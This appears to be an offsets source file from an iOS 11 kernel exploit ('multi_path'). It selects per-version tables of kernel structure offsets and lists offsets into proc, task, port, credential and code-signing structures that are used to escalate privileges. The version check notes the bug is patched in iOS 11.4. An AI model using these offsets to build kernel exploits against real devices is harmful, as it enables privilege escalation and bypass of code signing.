#import <Foundation/Foundation.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/sysctl.h>
#include <sys/utsname.h>

#include "multi_path_offsets.h"

int* multi_path_offsets = NULL;

int kstruct_offsets_11_0[] = {
  0xb,   // KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE,
  0x10,  // KSTRUCT_OFFSET_TASK_REF_COUNT,
  0x14,  // KSTRUCT_OFFSET_TASK_ACTIVE,
  0x20,  // KSTRUCT_OFFSET_TASK_VM_MAP,
  0x28,  // KSTRUCT_OFFSET_TASK_NEXT,
  0x30,  // KSTRUCT_OFFSET_TASK_PREV,
  0x308, // KSTRUCT_OFFSET_TASK_ITK_SPACE
  0x368, // KSTRUCT_OFFSET_TASK_BSD_INFO,
  
  0x0,   // KSTRUCT_OFFSET_IPC_PORT_IO_BITS,
  0x4,   // KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES,
  0x40,  // KSTRUCT_OFFSET_IPC_PORT_IKMQ_BASE,
  0x50,  // KSTRUCT_OFFSET_IPC_PORT_MSG_COUNT,
  0x60,  // KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER,
  0x68,  // KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT,
  0x88,  // KSTRUCT_OFFSET_IPC_PORT_IP_PREMSG,
  0x90,  // KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT,
  0xa0,  // KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS,
  
  0x10,  // KSTRUCT_OFFSET_PROC_PID,
  0x108, // KSTRUCT_OFFSET_PROC_P_FD
  
  0x0,   // KSTRUCT_OFFSET_FILEDESC_FD_OFILES
  
  0x8,   // KSTRUCT_OFFSET_FILEPROC_F_FGLOB
  
  0x38,  // KSTRUCT_OFFSET_FILEGLOB_FG_DATA
  
  0x10,  // KSTRUCT_OFFSET_SOCKET_SO_PCB
  
  0x10,  // KSTRUCT_OFFSET_PIPE_BUFFER
  
  0x14,  // KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE_SIZE
  0x20,  // KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE
  
  0x6c,  // KFREE_ADDR_OFFSET
};

int kstruct_offsets_11_3[] = {
  0xb,   // KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE,
  0x10,  // KSTRUCT_OFFSET_TASK_REF_COUNT,
  0x14,  // KSTRUCT_OFFSET_TASK_ACTIVE,
  0x20,  // KSTRUCT_OFFSET_TASK_VM_MAP,
  0x28,  // KSTRUCT_OFFSET_TASK_NEXT,
  0x30,  // KSTRUCT_OFFSET_TASK_PREV,
  0x308, // KSTRUCT_OFFSET_TASK_ITK_SPACE
  0x368, // KSTRUCT_OFFSET_TASK_BSD_INFO,
  
  0x0,   // KSTRUCT_OFFSET_IPC_PORT_IO_BITS,
  0x4,   // KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES,
  0x40,  // KSTRUCT_OFFSET_IPC_PORT_IKMQ_BASE,
  0x50,  // KSTRUCT_OFFSET_IPC_PORT_MSG_COUNT,
  0x60,  // KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER,
  0x68,  // KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT,
  0x88,  // KSTRUCT_OFFSET_IPC_PORT_IP_PREMSG,
  0x90,  // KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT,
  0xa0,  // KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS,
  
  0x10,  // KSTRUCT_OFFSET_PROC_PID,
  0x108, // KSTRUCT_OFFSET_PROC_P_FD
  
  0x0,   // KSTRUCT_OFFSET_FILEDESC_FD_OFILES
  
  0x8,   // KSTRUCT_OFFSET_FILEPROC_F_FGLOB
  
  0x38,  // KSTRUCT_OFFSET_FILEGLOB_FG_DATA
  
  0x10,  // KSTRUCT_OFFSET_SOCKET_SO_PCB
  
  0x10,  // KSTRUCT_OFFSET_PIPE_BUFFER
  
  0x14,  // KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE_SIZE
  0x20,  // KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE
  
  0x7c,  // KFREE_ADDR_OFFSET
};

int multi_path_koffset(enum multi_path_kstruct_offset offset) {
  if (multi_path_offsets == NULL) {
    printf("need to call offsets_init() prior to querying offsets\n");
    return 0;
  }
  return multi_path_offsets[offset];
}


void multi_path_offsets_init() {
  if (@available(iOS 11.4, *)) {
    printf("this bug is patched in iOS 11.4 and above\n");
    exit(EXIT_FAILURE);
  } else if (@available(iOS 11.3, *)) {
    printf("offsets selected for iOS 11.3 or above\n");
    multi_path_offsets = kstruct_offsets_11_3;
  } else if (@available(iOS 11.0, *)) {
    printf("offsets selected for iOS 11.0 to 11.2.6\n");
    multi_path_offsets = kstruct_offsets_11_0;
  } else {
    printf("iOS version too low, 11.0 required\n");
    exit(EXIT_FAILURE);
  }
}

unsigned offsetof_p_pid = 0x10;               // proc_t::p_pid
unsigned offsetof_task = 0x18;                // proc_t::task
unsigned offsetof_p_uid = 0x30;               // proc_t::p_uid
unsigned offsetof_p_gid = 0x34;               // proc_t::p_uid
unsigned offsetof_p_ruid = 0x38;              // proc_t::p_uid
unsigned offsetof_p_rgid = 0x3c;              // proc_t::p_uid
unsigned offsetof_p_ucred = 0x100;            // proc_t::p_ucred
unsigned offsetof_p_csflags = 0x2a8;          // proc_t::p_csflags
unsigned offsetof_itk_self = 0xD8;            // task_t::itk_self (convert_task_to_port)
unsigned offsetof_itk_sself = 0xE8;           // task_t::itk_sself (task_get_special_port)
unsigned offsetof_itk_bootstrap = 0x2b8;      // task_t::itk_bootstrap (task_get_special_port)
unsigned offsetof_itk_space = 0x308;          // task_t::itk_space
unsigned offsetof_ip_mscount = 0x9C;          // ipc_port_t::ip_mscount (ipc_port_make_send)
unsigned offsetof_ip_srights = 0xA0;          // ipc_port_t::ip_srights (ipc_port_make_send)
unsigned offsetof_ip_kobject = 0x68;          // ipc_port_t::ip_kobject
unsigned offsetof_p_textvp = 0x248;           // proc_t::p_textvp
unsigned offsetof_p_textoff = 0x250;          // proc_t::p_textoff
unsigned offsetof_p_cputype = 0x2c0;          // proc_t::p_cputype
unsigned offsetof_p_cpu_subtype = 0x2c4;      // proc_t::p_cpu_subtype
unsigned offsetof_special = 2 * sizeof(long); // host::special
unsigned offsetof_ipc_space_is_table = 0x20;  // ipc_space::is_table?..

unsigned offsetof_ucred_cr_uid = 0x18;        // ucred::cr_uid
unsigned offsetof_ucred_cr_ruid = 0x1c;       // ucred::cr_ruid
unsigned offsetof_ucred_cr_svuid = 0x20;      // ucred::cr_svuid
unsigned offsetof_ucred_cr_ngroups = 0x24;    // ucred::cr_ngroups
unsigned offsetof_ucred_cr_groups = 0x28;     // ucred::cr_groups
unsigned offsetof_ucred_cr_rgid = 0x68;       // ucred::cr_rgid
unsigned offsetof_ucred_cr_svgid = 0x6c;      // ucred::cr_svgid

unsigned offsetof_v_type = 0x70;              // vnode::v_type
unsigned offsetof_v_id = 0x74;                // vnode::v_id
unsigned offsetof_v_ubcinfo = 0x78;           // vnode::v_ubcinfo

unsigned offsetof_ubcinfo_csblobs = 0x50;     // ubc_info::csblobs

unsigned offsetof_csb_cputype = 0x8;          // cs_blob::csb_cputype
unsigned offsetof_csb_flags = 0x12;           // cs_blob::csb_flags
unsigned offsetof_csb_base_offset = 0x16;     // cs_blob::csb_base_offset
unsigned offsetof_csb_entitlements_offset = 0x98; // cs_blob::csb_entitlements
unsigned offsetof_csb_signer_type = 0xA0;     // cs_blob::csb_signer_type
unsigned offsetof_csb_platform_binary = 0xA4; // cs_blob::csb_platform_binary
unsigned offsetof_csb_platform_path = 0xA8;   // cs_blob::csb_platform_path

unsigned offsetof_t_flags = 0x3a0; // task::t_flags


